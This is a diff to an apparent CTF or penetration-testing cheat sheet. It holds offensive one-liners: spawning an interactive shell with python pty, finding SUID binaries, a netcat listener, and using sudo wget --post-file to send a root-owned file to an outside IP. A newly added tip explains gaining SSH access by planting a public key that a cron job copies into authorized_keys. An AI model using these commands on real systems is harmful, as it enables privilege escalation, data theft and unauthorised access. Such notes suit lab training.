@@ -36,14 +36,14 @@ Getting rev shell when there is a chance to write a comment
 
 SPAWNING INTTERACTING SHELL WITH PYTHON
 
-`python3 -c 'import pty;pty.spawn("/bin/bash")'`   
+python3 -c 'import pty;pty.spawn("/bin/bash")'
 
 <br />
 <br />
 
 Listing all binaries with suid permission
 
-`find / -perm -u=s -type f 2>/dev/null`
+find / -perm -u=s -type f 2>/dev/null
 
 Finds all files with IP address inside it:
 
@@ -546,3 +546,11 @@ sudo nc -lvpn 80
 sudo /usr/bin/wget --post-file=/root/root_flag.txt 10.11.30.36 
 
 shows content of file in another terminal with netcat
+
+<br />
+<br />
+
+
+If we have id_rsa.pub of a user, there should be some cron which sends it to authorized_keys
+
+Therefore, we copy our id_rsa.pub to user's and should be able to get into server
